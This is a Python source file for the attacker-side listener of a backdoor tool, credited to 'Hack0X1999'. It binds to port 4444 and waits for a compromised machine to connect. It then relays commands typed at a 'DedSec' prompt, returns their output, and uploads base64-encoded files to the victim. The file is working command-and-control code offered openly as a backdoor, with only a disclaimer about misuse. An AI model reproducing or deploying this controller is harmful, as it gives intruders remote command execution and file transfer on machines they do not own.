import socket
import base64 as code


def list_to_str(list):
    new_str = ""
    for element in list:
        new_str = new_str + element + ' '
    return new_str

class Connection:
    def __init__(self):
        self.history = []
        self.listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

    def start(self):
        print("[!] Waiting for any connection...")
        self.listen.bind(("192.168.1.10", 4444))
        self.listen.listen(0)
        self.connection, address = self.listen.accept()
        print("[+] Accepted")
        print("""\033[0;32m



                    \\\\----//   || //   /\\  \\\\  //
                     \\\\--//    ||//   //\\\\  \\\\//
                      \\\\// === ||-   //^^\\\\  ||
                       \/      ||   /......\\ ||\033[0m


                      [Created by : Hack0X1999]
                      [Country    : Egypt]
                      \033[0;35m[Gethub     : https://github.com/Abdelrahman)
                      (-Security159/Penetrating/issues]
                      \033[0;33m[License    : Free_with_good_using]
                      \033[0;31m[!] Worning! I'm not responsible about any)
                      (bad using of this backdoor]\033[0m
        """)
    def send(self, data):
        self.connection.send(data.encode("UTF-8"))

    def send_noUTF(self, data):
        self.connection.send(data)

    def recv(self):
        data = ""
        buffer = 1024
        while True:
            part = self.connection.recv(buffer).decode("UTF-8")
            data += part
            if len(part) < buffer:
                break
        return data

    def close(self):
        self.connection.close()

    def read(self, path):
        with open(path, "rb") as file:
            return code.b64encode(file.read())


#<<<<<<<<<<<<<<<<<<<<<<<< Running >>>>>>>>>>>>>>>>>>>>>>>>>>#

hack = Connection()
hack.start()
while True:
    try:
        command = input("DedSec/~>> ").split(' ')
        hack.history.append(list_to_str(command))
        if command[0] == "exit":
            hack.send(list_to_str(command))
            hack.close()
            exit()
        elif command[0] == "cd" and len(command) > 1:
            hack.send(list_to_str(command))
        elif command[0] == "history":
            counter = 1
            for element in hack.history:
                print(f"{counter} : {element}")
                counter += 1
            continue
        elif command[0] == "upload":
            count = 0
            print(command[0])
            data = hack.read(command[1])
            while True:
                if count == 0:
                    hack.send(list_to_str(command))
                    count += 1
                ack = hack.recv()
                if ack == "OK":
                    print("[+] Acknoledgment of Command was receved.")
                    hack.send_noUTF(data)
                    ack = hack.recv()
                    if ack == "OK":
                        print("[+] Acknoledgment of Data was receved.")
                        hack.send(str(len(data)) + " ")
                        print("Length : " + str(len(data)))
                        ack = hack.recv()
                        if ack == "NO":
                            print("NO")
                            continue
                        else:
                            print(ack)
                            break
            continue
        else:
            data_to_send = list_to_str(command)
            hack.send(data_to_send)

        data = hack.recv()
        if data == "chdir":
            print("[+] Changed Successfully.")
        else:
            print(data)

    #except Exception:
    #    print("[-] Error was found.")
    except KeyboardInterrupt:
        print("\n[-] Program was interrubted.")
        break
